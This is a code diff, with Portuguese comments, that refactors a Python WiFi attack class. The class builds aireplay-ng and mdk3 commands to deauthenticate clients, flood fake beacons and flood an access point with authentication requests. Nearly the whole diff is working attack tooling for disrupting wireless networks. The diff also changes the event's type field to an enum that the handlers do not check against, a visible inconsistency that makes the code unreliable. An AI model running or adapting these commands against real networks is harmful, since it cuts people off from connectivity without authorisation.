@@ -28,6 +28,9 @@ from ...core.utils import (
     get_interface_mac
 )
 
+# Importa o decorador de registro de ataques
+from . import register_attack
+
 # Configuração de logging
 logging.basicConfig(level=logging.INFO)
 logger = logging.getLogger(__name__)
@@ -57,34 +60,32 @@ class DeauthEventType(Enum):
 @dataclass
 class DeauthEvent:
     """Evento de progresso do ataque de desautenticação."""
-    type: DeauthEventType
+    type: DeauthAttackType
     message: str = ""
     data: Dict[str, Any] = field(default_factory=dict)
 
+@register_attack
 class DeauthAttack:
-    """Classe para realizar ataques de desautenticação."""
+    """
+    Ataque de desautenticação WiFi.
     
-    def __init__(self, interface: str = None, deauth_type: DeauthAttackType = DeauthAttackType.DEAUTH):
-        """
-        Inicializa o ataque de desautenticação.
-        
-        Args:
-            interface: Interface de rede para usar no ataque
-            deauth_type: Tipo de ataque de desautenticação
-        """
-        self.interface = interface
-        self.deauth_type = deauth_type
+    Este ataque envia pacotes de desautenticação para desconectar clientes de uma rede WiFi.
+    Pode ser direcionado a um cliente específico ou a todos os clientes de uma rede.
+    """
+    
+    # Metadados do ataque
+    name = "deauth"
+    description = "Ataque de desautenticação WiFi para desconectar clientes de uma rede"
+    
+    def __init__(self):
+        """Inicializa o ataque de desautenticação."""
+        self.interface = None
+        self.deauth_type = None
         self.is_running = False
         self.stop_requested = False
         self.packets_sent = 0
         self.process = None
-        
-        # Verifica dependências
         self._check_dependencies()
-        
-        # Verifica privilégios
-        if not is_root():
-            raise PermissionError("Este ataque requer privilégios de root")
     
     def _check_dependencies(self) -> None:
         """Verifica se todas as dependências necessárias estão instaladas."""
@@ -97,36 +98,53 @@ class DeauthAttack:
                 "Instale-as com: sudo apt install aircrack-ng mdk4 mdk3 wireless-tools"
             )
     
-    def start(self, bssid: str, client_mac: str = None, 
-             count: int = 0, delay: int = 100,
-             reason: int = 7, channel: int = None,
-             callback: Callable[[DeauthEvent], None] = None) -> bool:
+    def run(self, *, iface: str, target: Optional[str] = None, **kwargs) -> bool:
         """
-        Inicia o ataque de desautenticação.
+        Executa o ataque de desautenticação.
         
         Args:
-            bssid: Endereço MAC do ponto de acesso
-            client_mac: Endereço MAC do cliente (None para broadcast)
-            count: Número de pacotes a enviar (0 para contínuo)
-            delay: Atraso entre pacotes em milissegundos
-            reason: Código de motivo da desautenticação
-            channel: Canal da rede (opcional, tenta detectar automaticamente)
-            callback: Função de callback para eventos
-            
-        Returns:
-            True se o ataque foi iniciado com sucesso, False caso contrário
+            iface: Interface de rede a ser usada
+            target: Endereço MAC do alvo (pode ser um cliente ou AP)
+            **kwargs: Argumentos adicionais:
+                - bssid: Endereço MAC do ponto de acesso (obrigatório se target for um cliente)
+                - client_mac: Endereço MAC do cliente (opcional, None para broadcast)
+                - count: Número de pacotes a enviar (0 para contínuo, padrão: 0)
+                - delay: Atraso entre pacotes em ms (padrão: 100)
+                - reason: Código de motivo (padrão: 7)
+                - channel: Canal da rede (opcional, tenta detectar)
+                - deauth_type: Tipo de ataque (padrão: DEAUTH)
         """
-        self.is_running = True
-        self.stop_requested = False
-        self.packets_sent = 0
+        self.interface = iface
+        bssid = target or kwargs.get('bssid')
+        client_mac = kwargs.get('client_mac')
+        count = kwargs.get('count', 0)
+        delay = kwargs.get('delay', 100)
+        reason = kwargs.get('reason', 7)
+        channel = kwargs.get('channel')
+        deauth_type = kwargs.get('deauth_type', 'DEAUTH')
         
-        # Configura o monitoramento de eventos
+        # Configura o tipo de ataque
+        self.deauth_type = DeauthAttackType[deauth_type.upper()] if isinstance(deauth_type, str) else deauth_type
+        
+        # Função de callback padrão
+        def default_callback(event):
+            if event.type == DeauthEventType.INFO:
+                logger.info(event.message)
+            elif event.type == DeauthEventType.ERROR:
+                logger.error(event.message)
+        
+        callback = kwargs.get('callback', default_callback)
+        
         def event_handler(event_type: DeauthEventType, message: str = "", **kwargs):
             if callback:
                 event = DeauthEvent(type=event_type, message=message, data=kwargs)
                 callback(event)
         
         try:
+            # Verifica privilégios
+            if not is_root():
+                raise PermissionError("Este ataque requer privilégios de root")
+            
             # Define o canal, se especificado
             if channel:
                 self._set_channel(channel)
@@ -136,14 +154,6 @@ class DeauthAttack:
                 cmd = self._prepare_beacon_attack(bssid, essid="FREE_WIFI")
             elif self.deauth_type == DeauthAttackType.AUTH_DOS:
                 cmd = self._prepare_auth_dos(bssid)
-            elif self.deauth_type == DeauthAttackType.DEAUTH_BROADCAST:
-                cmd = self._prepare_broadcast_deauth(bssid, count, delay, reason)
-            elif self.deauth_type == DeauthAttackType.DEAUTH_MULTICAST:
-                cmd = self._prepare_multicast_deauth(bssid, count, delay, reason)
-            elif self.deauth_type == DeauthAttackType.DEAUTH_DIRECTED:
-                if not client_mac:
-                    raise ValueError("Endereço MAC do cliente é necessário para desautenticação direcionada")
-                cmd = self._prepare_directed_deauth(bssid, client_mac, count, delay, reason)
             else:  # Desautenticação padrão
                 cmd = self._prepare_standard_deauth(bssid, client_mac, count, delay, reason)
             
@@ -159,6 +169,7 @@ class DeauthAttack:
             
             # Monitora a saída
             start_time = time.time()
+            self.is_running = True
             
             while True:
                 # Verifica se foi solicitado para parar
@@ -199,142 +210,53 @@ class DeauthAttack:
             return True
             
         except Exception as e:
-            event_handler(
-                DeauthEventType.ERROR,
-                f"Erro durante o ataque de desautenticação: {str(e)}"
-            )
+            event_handler(DeauthEventType.ERROR, f"Erro durante o ataque: {str(e)}")
             return False
-        
         finally:
             self.is_running = False
-            self._stop_process()
+    
+    def _set_channel(self, channel: int) -> None:
+        """Define o canal da interface de rede."""
+        try:
+            subprocess.run(
+                ["iwconfig", self.interface, "channel", str(channel)],
+                check=True,
+                capture_output=True
+            )
+        except subprocess.CalledProcessError as e:
+            raise RuntimeError(f"Falha ao definir o canal {channel}: {e.stderr}")
     
     def _prepare_standard_deauth(self, bssid: str, client_mac: str = None,
-                              count: int = 0, delay: int = 100,
-                              reason: int = 7) -> List[str]:
+                               count: int = 0, delay: int = 100,
+                               reason: int = 7) -> List[str]:
         """Prepara o comando para desautenticação padrão."""
-        cmd = [
-            'aireplay-ng',
-            '--deauth', str(count) if count > 0 else '0',
-            '-a', bssid,
-            '-h', get_interface_mac(self.interface) or '00:11:22:33:44:55',
-            '--ignore-negative-one',
-        ]
+        cmd = ["aireplay-ng", "--deauth", str(count) if count > 0 else "0",
+               "-a", bssid, "-D", str(delay), "--ignore-negative-one"]
         
-        if client_mac and client_mac.lower() != 'ff:ff:ff:ff:ff:ff':
-            cmd.extend(['-c', client_mac])
-        
-        if delay > 0:
-            cmd.extend(['--deauth', str(delay)])
+        if client_mac:
+            cmd.extend(["-c", client_mac])
         
         cmd.append(self.interface)
         return cmd
     
     def _prepare_beacon_attack(self, bssid: str, essid: str = "FREE_WIFI") -> List[str]:
         """Prepara o comando para ataque de Beacon Flood."""
-        # Usa o mdk3 para enviar beacons falsos
-        return [
-            'mdk3', self.interface, 'b',
-            '-n', essid,
-            '-c', '1,6,11',  # Canais 1, 6 e 11 (2.4GHz)
-            '-s', '1000'     # Velocidade de envio
-        ]
+        return ["mdk3", self.interface, "b", "-n", essid, "-c", "1", "-s", "100"]
     
     def _prepare_auth_dos(self, bssid: str) -> List[str]:
         """Prepara o comando para ataque de negação de serviço por autenticação."""
-        # Usa o mdk3 para enviar solicitações de autenticação em massa
-        return [
-            'mdk3', self.interface, 'a',
-            '-a', bssid,
-            '-m',             # Usa endereços MAC aleatórios
-            '-s', '1000'      # Velocidade de envio
-        ]
+        return ["mdk3", self.interface, "a", "-a", bssid, "-m"]
     
-    def _prepare_broadcast_deauth(self, bssid: str, count: int, delay: int, reason: int) -> List[str]:
-        """Prepara o comando para desautenticação em broadcast."""
-        return [
-            'mdk3', self.interface, 'd',
-            '-b', bssid,
-            '-c', str(self._get_channel() or '1'),
-            '-s', '1000',
-            '-n', str(count) if count > 0 else '0'
-        ]
-    
-    def _prepare_multicast_deauth(self, bssid: str, count: int, delay: int, reason: int) -> List[str]:
-        """Prepara o comando para desautenticação em multicast."""
-        # Usa o aireplay-ng para enviar pacotes de desautenticação em multicast
-        return [
-            'aireplay-ng',
-            '--deauth', str(count) if count > 0 else '0',
-            '-a', bssid,
-            '-h', '01:00:5E:00:00:01',  # Endereço multicast
-            '--ignore-negative-one',
-            self.interface
-        ]
-    
-    def _prepare_directed_deauth(self, bssid: str, client_mac: str, 
-                               count: int, delay: int, reason: int) -> List[str]:
-        """Prepara o comando para desautenticação direcionada."""
-        return [
-            'aireplay-ng',
-            '--deauth', str(count) if count > 0 else '0',
-            '-a', bssid,
-            '-c', client_mac,
-            '--ignore-negative-one',
-            self.interface
-        ]
-    
-    def _set_channel(self, channel: int) -> bool:
-        """Define o canal da interface de rede."""
-        try:
-            subprocess.run(
-                ['iwconfig', self.interface, 'channel', str(channel)],
-                check=True,
-                capture_output=True
-            )
-            return True
-        except subprocess.CalledProcessError as e:
-            logger.error(f"Erro ao definir o canal: {e.stderr}")
-            return False
-    
-    def _get_channel(self) -> Optional[int]:
-        """Obtém o canal atual da interface de rede."""
-        try:
-            result = subprocess.run(
-                ['iwconfig', self.interface],
-                capture_output=True,
-                text=True
-            )
-            
-            # Procura por algo como "Channel:11" ou "Frequency:2.412 GHz (Channel 1)"
-            match = re.search(r'Channel:(\d+)', result.stdout)
-            if match:
-                return int(match.group(1))
-            
-            match = re.search(r'Channel\s+(\d+)', result.stdout)
-            if match:
-                return int(match.group(1))
-            
-            return None
-            
-        except Exception as e:
-            logger.error(f"Erro ao obter o canal: {e}")
-            return None
-    
-    def _stop_process(self):
+    def _stop_process(self) -> None:
         """Para o processo em execução."""
         if self.process and self.process.poll() is None:
+            self.process.terminate()
             try:
-                self.process.terminate()
                 self.process.wait(timeout=5)
-            except:
-                try:
-                    self.process.kill()
-                except:
-                    pass
+            except subprocess.TimeoutExpired:
+                self.process.kill()
     
-    def stop(self):
+    def stop(self) -> None:
         """Solicita a interrupção do ataque."""
         self.stop_requested = True
         self._stop_process()
-        self.is_running = False
